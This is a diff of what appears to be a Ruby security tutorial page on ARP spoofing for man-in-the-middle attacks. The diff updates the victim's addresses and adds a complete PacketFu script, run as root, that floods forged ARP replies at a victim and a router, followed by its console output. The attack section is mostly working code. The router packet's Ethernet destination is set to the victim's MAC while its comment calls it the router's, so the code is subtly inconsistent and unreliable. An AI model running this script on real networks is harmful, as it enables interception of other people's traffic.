@@ -7,7 +7,7 @@ As you know, ARP Spoofing attack in the core of MiTM attack.
 | Host/Info |   IP Address  |    MAC Address    |
 |-----------|:-------------:|:-----------------:|
 | Attacker  | 192.168.0.100 | 3C:77:E6:68:66:E9 |
-| Victim    | 192.168.0.19  | 00:50:7F:E6:96:21 |
+| Victim    | 192.168.0.21  | 00:0C:29:38:1D:61 |
 | Router    | 192.168.0.1   | 00:50:7F:E6:96:20 |
 
 To know our/attacker's interface information
@@ -35,24 +35,25 @@ So you can extract these information like any hash `info[:iface]`, `info[:ip_sad
 # Build Ethernet header
 arp_packet_victim = PacketFu::ARPPacket.new
 arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
-arp_packet_victim.eth_daddr = "00:50:7F:E6:96:21"       # the victim's MAC address
+arp_packet_victim.eth_daddr = "00:0C:29:38:1D:61"       # the victim's MAC address
 # Build ARP Packet
 arp_packet_victim.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
-arp_packet_victim.arp_daddr_mac = "00:50:7F:E6:96:21"   # the victim's MAC address
+arp_packet_victim.arp_daddr_mac = "00:0C:29:38:1D:61"   # the victim's MAC address
 arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # the router's IP
-arp_packet_victim.arp_daddr_ip = "192.168.0.19"         # the victim's IP
+arp_packet_victim.arp_daddr_ip = "192.168.0.21"         # the victim's IP
 arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
-````
+```
+
 **Building router packet**
 ```ruby
 # Build Ethernet header
 arp_packet_router = PacketFu::ARPPacket.new
 arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
-arp_packet_router.eth_daddr = "00:50:7F:E6:96:21"       # the router's MAC address
+arp_packet_router.eth_daddr = "00:0C:29:38:1D:61"       # the router's MAC address
 # Build ARP Packet
 arp_packet_router.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
 arp_packet_router.arp_daddr_mac = "00:50:7F:E6:96:20"   # the router's MAC address
-arp_packet_router.arp_saddr_ip = "192.168.0.19"         # the victim's IP
+arp_packet_router.arp_saddr_ip = "192.168.0.21"         # the victim's IP
 arp_packet_router.arp_daddr_ip = "192.168.0.1"          # the router's IP
 arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
 
@@ -60,14 +61,73 @@ arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP repl
 Run ARP Spoofing attack
 
 ```ruby
-# Run until we get killed by the parent, sending out packets
+# Send our packet through the wire
 while true
     sleep 1
+    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
     arp_packet_victim.to_w(info[:iface])
+    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
     arp_packet_router.to_w(info[:iface])
 end
 ```
 Source[^*]
+
+putting all together and run as `root`
+
+```ruby
+require 'packetfu'
+
+
+info = PacketFu::Utils.whoami?(:iface => "wlan0")
+
+
+# Build Ethernet header
+arp_packet_victim = PacketFu::ARPPacket.new
+arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
+arp_packet_victim.eth_daddr = "00:0C:29:38:1D:61"       # the victim's MAC address
+# Build ARP Packet
+arp_packet_victim.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
+arp_packet_victim.arp_daddr_mac = "00:0C:29:38:1D:61"   # the victim's MAC address
+arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # the router's IP
+arp_packet_victim.arp_daddr_ip = "192.168.0.21"         # the victim's IP
+arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
+
+
+
+# Build Ethernet header
+arp_packet_router = PacketFu::ARPPacket.new
+arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
+arp_packet_router.eth_daddr = "00:0C:29:38:1D:61"       # the router's MAC address
+# Build ARP Packet
+arp_packet_router.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
+arp_packet_router.arp_daddr_mac = "00:50:7F:E6:96:20"   # the router's MAC address
+arp_packet_router.arp_saddr_ip = "192.168.0.21"         # the victim's IP
+arp_packet_router.arp_daddr_ip = "192.168.0.1"          # the router's IP
+arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
+
+
+while true
+    sleep 1
+    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
+    arp_packet_victim.to_w(info[:iface])
+    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
+    arp_packet_router.to_w(info[:iface])
+end
+```
+
+Returns, time to wiresharking ;)
+```
+[+] Sending ARP packet to victim: 192.168.0.21
+[+] Sending ARP packet to router: 192.168.0.1
+.
+.
+.
+[+] Sending ARP packet to victim: 192.168.0.21
+[+] Sending ARP packet to router: 192.168.0.1
+[+] Sending ARP packet to victim: 192.168.0.21
+[+] Sending ARP packet to router: 192.168.0.1
+```
+
 
 
 <br><br>
